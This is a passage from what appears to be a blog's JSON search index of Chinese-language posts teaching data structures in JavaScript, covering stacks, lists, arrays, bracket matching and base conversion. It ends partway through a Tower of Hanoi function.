内容小结\n\n<p>复杂度也叫渐进复杂度，包括时间复杂度和空间复杂度，用来分析算法执行效率与数据规模之间的增长关系，可以粗略地表示，越高阶复杂度的算法，执行效率越低。常见的复杂度并不多，从低阶到高阶有：O(1)、O(logn)、O(n)、O(nlogn)、O(n<sup>2</sup> )。<strong>复杂度分析并不难，关键在于多练。</strong></p>\n\n另外还有四个时间复杂度知识可以进一步学习下：最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度。\n\n# 参考\n\n极客时间——数据结构与算法之美\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@括号匹配","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D%2F","content":"\n# 概述\n\n写一个函数判断给定算术表达式中的括号是否匹配，例如`1/2+(3+4`是不匹配。\n\n<!-- more -->\n\n# 详述\n\n```js\n// 判断一个算术表达式中的括号是否匹配;\nfunction parenthesesChecker(symbols) {\n  const stack = new Stack();\n  const opens = \"([{\";\n  const closers = \")]}\";\n  let balanced = true;\n  let index = 0;\n  let symbol;\n  let top;\n\n  while (index < symbols.length && balanced) {\n    symbol = symbols[index];\n    if (opens.indexOf(symbol) >= 0) {\n      stack.push(symbol);\n    } else if (stack.isEmpty()) {\n      balanced = false;\n    } else {\n      top = stack.pop();\n      if (!(opens.indexOf(top) === closers.indexOf(symbol))) {\n        balanced = false;\n      }\n    }\n    index++;\n  }\n  return balanced && stack.isEmpty();\n}\n\nconsole.log(\"{([])}\", parenthesesChecker(\"{([])}\")); // true\nconsole.log(\"{{([][])}()}\", parenthesesChecker(\"{{([][])}()}\")); // true\nconsole.log(\"[{()]\", parenthesesChecker(\"[{()]\")); // false\n```\n\n# 参考\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@数组练习题","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E6%95%B0%E7%BB%84%E7%BB%83%E4%B9%A0%E9%A2%98%2F","content":"\n# 概述\n\n数据结构数组相关练习题。\n\n<!-- more -->\n\n# 详述\n\n## 练习一\n\n创建一个记录学生成绩的对象，提供一个添加成绩的方法，以及一个现实学生平均成绩的方法。\n\n```js\nclass Grades {\n  constructor() {\n    this.dataStore = [];\n  }\n  add(gradeNum) {\n    if (typeof gradeNum !== \"number\") {\n      return;\n    }\n    this.dataStore.push(gradeNum);\n  }\n  average() {\n    if (this.dataStore.length === 0) {\n      return;\n    }\n    let totoal = this.dataStore.reduce((pre, cur) => {\n      return pre + cur;\n    });\n    return (totoal / this.dataStore.length).toFixed(2);\n  }\n}\n\nlet grades = new Grades();\ngrades.add(80);\ngrades.add(90);\ngrades.add(110);\nconsole.log(grades.average()); // 93.33\n```\n\n## 练习二\n\n将一组单词存储在一个数组中，并按正序和倒序分别显示这些单词。\n\n```js\nlet arr = [\"baidu\", \"ali\", \"tengxun\", \"jingdong\"];\nlet str = arr.sort().join(\",\");\nlet str2 = arr\n  .sort()\n  .reverse()\n  .join(\",\");\nconsole.log(str); // ali,baidu,jingdong,tengxun\nconsole.log(str2); // tengxun,jingdong,baidu,ali\n```\n\n## 练习三\n\n用一个二维数组存储每月的有用数据，增加一些方法显示月平均数，某一周平均数。\n\n```js\nclass MonthlyTemps {\n  constructor() {\n    this.dataStore = [];\n  }\n  add(weekIndex, temp) {\n    if (!this.dataStore[weekIndex]) {\n      this.dataStore.push([]);\n    }\n    this.dataStore[weekIndex].push(temp);\n  }\n  average(weekIndex) {\n    let total = 0,\n      count = 0;\n    if (typeof weekIndex !== \"undefined\") {\n      count = this.dataStore[weekIndex].length;\n      total = this.dataStore[weekIndex].reduce((pre, cur) => {\n        return pre + cur;\n      });\n      return (total / count).toFixed(2);\n    } else {\n      this.dataStore.forEach(ele => {\n        if (!Array.isArray(ele)) {\n          return;\n        }\n        count += ele.length;\n        let weekTotal = ele.reduce((pre, cur) => {\n          return pre + cur;\n        });\n        total += weekTotal;\n      });\n    }\n    return (total / count).toFixed(2);\n  }\n}\n\nlet monthlyTemps = new MonthlyTemps();\nmonthlyTemps.add(0, 52);\nmonthlyTemps.add(0, 55);\nmonthlyTemps.add(0, 61);\nmonthlyTemps.add(0, 65);\nmonthlyTemps.add(0, 50);\nmonthlyTemps.add(0, 57);\nmonthlyTemps.add(0, 59);\n\nmonthlyTemps.add(1, 54);\nmonthlyTemps.add(1, 55);\nmonthlyTemps.add(1, 61);\nmonthlyTemps.add(1, 65);\nmonthlyTemps.add(1, 50);\nmonthlyTemps.add(1, 57);\nmonthlyTemps.add(1, 59);\n\nconsole.log(monthlyTemps.average(0)); // 57.00\nconsole.log(monthlyTemps.average()); // 57.14\n```\n\n## 练习四\n\n创建这样一个对象，它将字符存储在一个数组中，并且用一个方法可以将字母连在一起，显示成一个单词。\n\n```js\nclass MyLetters {\n  constructor() {\n    this.dataStore = [];\n  }\n  add(letter) {\n    this.dataStore.push(letter);\n  }\n  word() {\n    return this.dataStore.join(\"\");\n  }\n}\n\nlet myLetters = new MyLetters();\nmyLetters.add(\"h\");\nmyLetters.add(\"i\");\nlet myword = myLetters.word();\nconsole.log(myword); // hi\n```\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@数组","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E6%95%B0%E7%BB%84%2F","content":"\n# 概述\n\n数组是计算机编程世界里最常见的数据结构。任何编程语言都包含，为内建类型，效率很高。本篇主要梳理 JavaScript 中数组的相关知识点。整体结构如下，具体细节见参考书籍，常见使用场景见详述部分。\n![思维导图](0.svg)\n\n<!-- more -->\n\n# 详述\n\n数组在 JavaScript 中只是一种特殊的对象，所以一个数组中的元素可以是各种类型，不必像其他语言要求是同一种类型。\n\n## sort 中使用比较函数\n\nsort()方法是按照字典顺序对元素进行排序的，因此它假定元素都是字符串类型。实际场景中通常需要排序数字类型、对象类型等，这样就需要传入一个比较函数来实现我们的目标。\n\n### 数字类型排序\n\n```js\nvar numbers = [10, 3, 22, 6, 4];\nnumbers.sort();\n// [10, 22, 3, 4, 6]\n\nfunction compare(num1, num2) {\n  return num1 - num2;\n}\nnumbers.sort(compare);\n// [3, 4, 6, 10, 22]\n```\n\n### 对象类型排序\n\n```js\nvar students = [\n  {\n    name: \"baidu\",\n    age: 12\n  },\n  {\n    name: \"ali\",\n    age: 22\n  },\n  {\n    name: \"tengxun\",\n    age: 8\n  }\n];\n\nfunction compareFunc(propName) {\n  return function(obj1, obj2) {\n    var value1 = obj1[propName];\n    var value2 = obj2[propName];\n    if (value1 < value2) {\n      return -1;\n    } else if (value1 > value2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  };\n}\n// 按age排序\nstudents.sort(compareFunc(\"age\"));\n// 按name排序\nstudents.sort(compareFunc(\"name\"));\n```\n\n## 创建二维数组通用方法\n\n```js\nArray.matrix = function(numRows, numCols, initial) {\n  var arr = [];\n  for (var i = 0; i < numRows; i++) {\n    var columns = [];\n    for (var j = 0; j < numCols; j++) {\n      columns[j] = initial;\n    }\n    arr[i] = columns;\n  }\n  return arr;\n};\n```\n\n## 练习\n\n更多练习及实现答案请参考下一篇[数据结构——数组(练习题及实现)](/2019/04/28/data-structures-array-2)\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n《学习 JavaScript 数据结构与算法（第 2 版）》\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@栈","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E6%A0%88%2F","content":"\n# 概述\n\n栈是一种高效的数据结构，因为数据只能在栈顶添加或删除，所以这样的操作很快，而且容易实现。\n\n栈的实际应用非常广泛。在回溯问题中，它可以存储访问过的任务或路径、撤销的操作（后\n面的章节讨论图和回溯问题时，我们会学习如何应用这个例子）。Java 和 C#用栈来存储变量和方\n法调用，特别是处理递归算法时，有可能抛出一个栈溢出异常。\n\n最后将学习使用栈的三个最著名的算法示例。首先是十进制转二进制问题，以及任意进制转换的算法；\n然后是平衡圆括号问题；最后，我们会学习如何用栈解决汉诺塔问题。\n\n本篇主要讲如何用 JavaScript 描述实现一个栈类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。\n![思维导图](0.svg)\n\n<!-- more -->\n\n# 详述\n\n## 栈的实现\n\n```js\nclass Stack {\n  constructor() {\n    this.dataStore = [];\n    this.top = 0;\n  }\n  push(element) {\n    this.dataStore[this.top++] = element;\n  }\n  pop() {\n    return this.dataStore[--this.top];\n  }\n  peek() {\n    return this.dataStore[this.top - 1];\n  }\n  clear() {\n    this.top = 0;\n  }\n  length() {\n    return this.top;\n  }\n}\n\n// 测试\nlet s = new Stack();\ns.push(\"ali\");\ns.push(\"baidu\");\ns.push(\"tengxun\");\nconsole.log(s.length()); // 3\nlet poped = s.pop();\nconsole.log(poped); // tengxun\nconsole.log(s.length()); // 2\nlet peeked = s.peek();\nconsole.log(\"peeked: \" + peeked); // peeked: baidu\n```\n\n## 使用 Stack 类\n\n### 数制间的相互转换\n\n利用栈将一个数字从一种数值转换成另一种数制。\n\n```js\n// 十进制整数转成任何进制\nfunction mulBase(num, base) {\n  const DIGITS = \"0123456789ABCDEF\";\n  let s = new Stack();\n  do {\n    s.push(num % base);\n    num = Math.floor(num / base);\n  } while (num > 0);\n\n  let converted = \"\";\n  while (s.length() > 0) {\n    converted += DIGITS[s.pop()];\n  }\n  return converted;\n}\n\nconsole.log(mulBase(100345, 2)); // 11000011111111001\nconsole.log(mulBase(100345, 8)); // 303771\nconsole.log(mulBase(100345, 16)); // 187F9\nconsole.log(mulBase(5, 2)); // 101\n```\n\n## 回文判断\n\n回文是指这样一种现象：一个单词、短语或数字，从前往后写和从后往前写都是一样的。例如，“dad”、“racecar”、1001。\n\n```js\n// 判断给定字符串是否是回文\nfunction isPalindrome(word) {\n  let s = new Stack();\n  for (let i = 0; i < word.length; i++) {\n    s.push(word[i]);\n  }\n  let rword = \"\";\n  while (s.length() > 0) {\n    rword += s.pop();\n  }\n  return word === rword;\n}\n// 实现二\nfunction isPalindrome2(word) {\n  word = word + \"\";\n  return (\n    word ===\n    word\n      .split(\"\")\n      .reverse()\n      .join(\"\")\n  );\n}\n\nconsole.log(\"hello: \" + isPalindrome(\"hello\"));\nconsole.log(\"racecar: \" + isPalindrome(\"racecar\"));\nconsole.log(\"1001: \" + isPalindrome(1001));\n```\n\n## 递归演示\n\n下面是一个递归函数，可以计算任何数字的阶乘：\n\n```js\nfunction factorial(n) {\n  if (n === 0) {\n    return 1;\n  } else {\n    return n * factorial(n - 1);\n  }\n}\n\nfunction fact(n) {\n  let s = new Stack();\n  while (n > 1) {\n    s.push(n--);\n  }\n  let product = 1;\n  while (s.length() > 0) {\n    product *= s.pop();\n  }\n  return product;\n}\n\nconsole.log(\"factorial: \" + factorial(5));\nconsole.log(\"fact: \" + fact(5));\n// factorial: 120\n// fact: 120\n```\n\n## 意外收获\n\n1. 浮点数怎么转换成二进制，怎么转成任意进制？\n\n```\n小数部分计算方法：\n乘2取整法，即每一步将十进制小数部分乘以2，所得积的小数点左边的数字（0或1）作为二进制表示法中的数字，直到满足你的精确度为止。\n0.874的转换过程（取精度为6位）：\n0.874*2＝1.748 小数点左边为 1\n0.748*2＝1.496 小数点左边为 1\n0.496*2＝0.992 小数点左边为 0\n0.992*2＝1.984 小数点左边为 1\n0.984*2＝1.968 小数点左边为 1\n0.968*2＝1.936 小数点左边为 1\n十进制：123.874 二进制：1111011.110111\n```\n\n2. 回文古诗验证？\n3. 如下图：\n![思维导图](1.jpg)\n\n## 练习\n\n更多练习及实现答案请参考下一篇[数据结构——栈（练习题及实现）](/2019/04/30/data-structures-stack-2)\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n《学习 JavaScript 数据结构与算法（第 2 版）》\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@列表练习题","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E5%88%97%E8%A1%A8%E7%BB%83%E4%B9%A0%E9%A2%98%2F","content":"\n# 概述\n\n数据结构列表相关练习题。\n\n<!-- more -->\n\n# 详述\n\n## 练习一\n\n增加一个向列表中插入元素的方法，该方法只在待插元素大于列表中的所有元素时才执行插入操作。这里的大于有多重含义，对于数字，它是数值上的大小；对于字母，它是在字母表中出现的先后顺序。（代码见练习二）\n\n## 练习二\n\n增加一个向列表中插入元素的方法，该方法只在待插元素小于列表中的所有元素时才执行插入操作。\n\n```js\n// 练习一和练习二\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n    }\n    return -1;\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  insertMax(element, after) {\n    let isMax = this.dataStore.every(value => {\n      if (/^[a-zA-Z]+$/.test(element) && /^[a-zA-Z]+$/.test(value)) {\n        return element.charCodeAt(0) > value.charCodeAt(0);\n      } else {\n        return element > value;\n      }\n    });\n    if (!isMax) {\n      return;\n    }\n    this.insert(element, after);\n  }\n  insertMin(element, after) {\n    let isMin = this.dataStore.every(value => {\n      if (/^[a-zA-Z]+$/.test(element)) {\n        return element.charCodeAt(0) < value.charCodeAt(0);\n      } else {\n        return element < value;\n      }\n    });\n    if (!isMin) {\n      return;\n    }\n    this.insert(element, after);\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n    }\n    return false;\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 练习一、二测试\nlet nums = new List();\nnums.append(5);\nnums.append(7);\nnums.append(6);\nnums.insertMax(10, 7);\nnums.insertMax(4, 7);\nnums.insertMin(1, 7);\nnums.insertMin(15, 7);\nconsole.log(nums);\n\nlet letterList = new List();\nletterList.append(\"f\");\nletterList.insertMax(\"F\", \"f\");\nletterList.insertMax(\"z\", \"f\");\nconsole.log(letterList);\n```\n\n## 练习三\n\n创建 Person 类，改类用于保存人的姓名和性别信息。创建一个至少包含 10 个 Person 对象的列表。写一个函数显示列表中所有拥有相同性别的人。\n\n```js\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n    }\n    return -1;\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n    }\n    return false;\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 定义客户类\nclass Person {\n  constructor(name, sex) {\n    this.name = name;\n    this.sex = sex;\n  }\n  toString() {\n    return \"\\nname: \" + this.name + \"@\" + \"sex: \" + this.sex;\n  }\n}\n\nlet personList = new List();\nfor (let i = 0; i < 10; i++) {\n  let name = \"jovy_\" + i;\n  let sex = [\"female\", \"male\"][Math.round(Math.random())];\n  const person = new Person(name, sex);\n  personList.append(person);\n}\n\nfunction displayList(list, sex) {\n  console.log(\"All: \" + list.dataStore);\n  let newList = list.dataStore.filter(element => {\n    return element.sex === sex;\n  });\n  console.log(\"Filter: \" + newList);\n}\n\ndisplayList(personList, \"male\");\n```\n\n## 练习四\n\n修改本章的影碟租赁程序，当一部影片检出后，将其加入一个已租影片列表。每当有客户检出一部影片，都显示该列表中的内容。（代码见练习五）\n\n## 练习五\n\n为影碟租赁程序创建一个 check-in()函数，当客户归还一部影片时，将该影片从已租列表中删除，同时添加到现有影片列表中。\n\n```js\n// 练习四和练习五\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n    }\n    return -1;\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n    }\n    return false;\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 定义客户类\nclass Customer {\n  constructor(name, movie) {\n    this.name = name;\n    this.movie = movie;\n  }\n  toString() {\n    return this.name + \"@\" + this.movie;\n  }\n}\n// 显示清单\nfunction displayList(list) {\n  for (list.front(); list.hasNext(); list.next()) {\n    if (list.getElement() instanceof Customer) {\n      console.log(\n        list.getElement()[\"name\"] + \", \" + list.getElement()[\"movie\"]\n      );\n    } else {\n      console.log(list.getElement());\n    }\n  }\n}\n\n// 检出电影\nfunction checkOut(name, movie, movieList, customerList, checkOutMovieList) {\n  if (movieList.contains(movie)) {\n    let c = new Customer(name, movie);\n    customerList.append(c);\n    movieList.remove(movie);\n    // 练习4\n    checkOutMovieList.append(movie);\n    console.log(\"\\nCheckOutMovieList: \\n\");\n    displayList(checkOutMovieList);\n  } else {\n    console.log(movie + \" is not available.\");\n  }\n}\n// 练习5\nfunction checkIn(name, movie, movieList, customerList, checkOutMovieList) {\n  let c = customerList.dataStore.find(element => {\n    return element.name === name && element.movie === movie;\n  });\n\n  customerList.remove(c);\n  movieList.append(movie);\n  checkOutMovieList.remove(movie);\n}\n\n// 测试+++++++++++++++++++++++++++++++\n// 模拟读取数据\nlet moviesStr =\n  \"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\";\nlet movies = moviesStr.split(\"，\");\n\n// 使用列表管理电影数据\nlet movieList = new List();\nmovies.forEach(element => {\n  movieList.append(element);\n});\n// 使用列表管理客户数据\nlet customerList = new List();\n\nlet checkOutMovieList = new List();\n\nconsole.log(\"Available movies: \\n\");\ndisplayList(movieList);\ncheckOut(\"Jovysun\", \"教父\", movieList, customerList, checkOutMovieList);\nconsole.log(\"\\nCustomer Rentals: \\n\");\ndisplayList(customerList);\nconsole.log(\"\\nMovies Now Available\\n\");\ndisplayList(movieList);\n\nconsole.log(\"after check-in+++++++++++++++++++++++++++++++++++++++\");\ncheckIn(\"Jovysun\", \"教父\", movieList, customerList, checkOutMovieList);\nconsole.log(\"\\nCustomer Rentals: \\n\");\ndisplayList(customerList);\nconsole.log(\"\\nMovies Now Available\\n\");\ndisplayList(movieList);\nconsole.log(\"\\nCheckOutMovieList: \\n\");\ndisplayList(checkOutMovieList);\n```\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@列表","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E5%88%97%E8%A1%A8%2F","content":"\n# 概述\n\n当不需要再一个很长的序列中查找元素，或者对其进行排序时，列表显得尤为有用。反之，如果数据结构非常复杂，列表的作用就没那么大了。本篇主要讲如何在 JavaScript 中实现一个列表类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。\n![思维导图](0.svg)\n\n<!-- more -->\n\n# 详述\n\n## 实现列表类\n\n```js\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n      return -1;\n    }\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n      return false;\n    }\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 测试\nlet names = new List();\nnames.append(\"jovy\");\nnames.append(\"sun\");\nnames.append(\"tom\");\nnames.append(\"lucy\");\nconsole.log(names);\n// List {\n//   listSize: 4,\n//   pos: 0,\n//   dataStore: [ 'jovy', 'sun', 'tom', 'lucy' ] }\nnames.next();\nnames.next();\nconsole.log(names.getElement());\n// tom\nnames.prev();\nconsole.log(names.getElement());\n// sun\n```\n\n## 使用迭代器访问列表\n\n```js\nconsole.log(\"1使用迭代器访问列表+++++++++++++++++\");\nfor (names.front(); names.hasNext(); names.next()) {\n  console.log(names.getElement());\n}\n// jovy\n// sun\n// tom\n// lucy\nconsole.log(\"2使用迭代器访问列表+++++++++++++++++\");\nfor (names.end(); names.hasPrev(); names.prev()) {\n  console.log(names.getElement());\n}\n// lucy\n// tom\n// sun\n// jovy\n```\n\n## 一个基于列表的应用\n\n模拟影碟租赁自助查询系统：查询可租借清单，查询用户租赁清单，用户租赁。\n\n```js\n// 定义客户类\nclass Customer {\n  constructor(name, movie) {\n    this.name = name;\n    this.movie = movie;\n  }\n}\n// 显示清单\nfunction displayList(list) {\n  for (list.front(); list.hasNext(); list.next()) {\n    if (list.getElement() instanceof Customer) {\n      console.log(\n        list.getElement()[\"name\"] + \", \" + list.getElement()[\"movie\"]\n      );\n    } else {\n      console.log(list.getElement());\n    }\n  }\n}\n\n// 检出电影\nfunction checkOut(name, movie, movieList, customerList) {\n  if (movieList.contains(movie)) {\n    let c = new Customer(name, movie);\n    customerList.append(c);\n    movieList.remove(movie);\n  } else {\n    console.log(movie + \" is not available.\");\n  }\n}\n\n// 测试+++++++++++++++++++++++++++++++\n// 模拟读取数据\nlet moviesStr =\n  \"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\";\nlet movies = moviesStr.split(\"，\");\n\n// 使用列表管理电影数据\nlet movieList = new List();\nmovies.forEach(element => {\n  movieList.append(element);\n});\n// 使用列表管理客户数据\nlet customerList = new List();\n\nconsole.log(\"Available movies: \\n\");\ndisplayList(movieList);\ncheckOut(\"Jovysun\", \"教父\", movieList, customerList);\nconsole.log(\"\\nCustomer Rentals: \\n\");\ndisplayList(customerList);\nconsole.log(\"\\nMovies Now Available\\n\");\ndisplayList(movieList);\n```\n\n## 练习\n\n更多练习及实现答案请参考下一篇[数据结构——列表(练习题及实现)](/2019/04/29/data-structures-list-2)\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@佩兹糖果盒","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E4%BD%A9%E5%85%B9%E7%B3%96%E6%9E%9C%E7%9B%92%2F","content":"\n# 概述\n\n你有一盒佩兹糖果盒，里面塞满红、黄、白三中颜色的糖果，但是你不喜欢黄色口味的糖果。使用栈写一段程序，在不改变盒内其他糖果叠放顺序的基础上，将黄色糖果移出。\n\n<!-- more -->\n\n# 详述\n\n```js\nfunction pez(num) {\n  // 原始糖盒\n  var box = new Stack();\n  // 糖的数组\n  var sugars = [\"红\", \"黄\", \"白\"];\n\n  // 模拟放置糖：根据数量创建糖，并且放到糖盒\n  for (var i = 0; i < num; i++) {\n    var random = Math.floor(Math.random() * 3);\n    box.push(sugars[random]);\n  }\n\n  console.log(\"筛选前顺序：\" + box.dataStore);\n\n  // 辅助盒子\n  var buffer = new Stack();\n  // 筛选糖果\n  while (box.length() > 0) {\n    let sugar = box.pop();\n    if (sugar !== \"黄\") {\n      buffer.push(sugar);\n    }\n  }\n\n  // 清空数据\n  box.clear();\n\n  // 筛选后糖果依次放回原盒子\n  while (buffer.length() > 0) {\n    let sugar = buffer.pop();\n    box.push(sugar);\n  }\n  console.log(\"筛选后顺序：\" + box.dataStore);\n}\n\npez(20);\n```\n\n# 参考\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@汉诺塔","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E6%B1%89%E8%AF%BA%E5%A1%94%2F","content":"\n# 概述\n\n有三根相邻的柱子，标号为 A,B,C，A 柱子上从下到上按金字塔状叠放着 n 个不同大小的圆盘，要把所有盘子一个一个移动到柱子 B 上，并且每次移动同一根柱子上都不能出现大盘子在小盘子上方，请问至少需要多少次移动，设移动次数为 H(n）。\n![汉诺塔玩具模型图](overview.jpg)\n\n<!-- more -->\n\n# 详述\n\n汉诺塔：汉诺塔（又称河内塔）问题是源于印度一个古老传说的益智玩具。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着 64 片黄金圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，在小圆盘上不能放大圆盘，在三根柱子之间一次只能移动一个圆盘。\n\n```js\nfunction towerOfHanoi(\n  plates,\n  source,\n  helper,\n  dest,\n  sourceName,\n  helperName,\n  destName,\n  moves = []\n) {\n  if (plates <= 0) {\n    return moves;\n  }\n  if (plates === 1) {\n    dest.push(source.pop());\n    const move = {};\n    move[sourceName] = source.toString();\n    move[helperName] = helper.toString();\n    move[destName] = dest.toString();\n    moves.push(move);\n  } else {\n    towerOfHanoi(\n      plates - 1,\n      source,\n      dest,\n      helper,\n      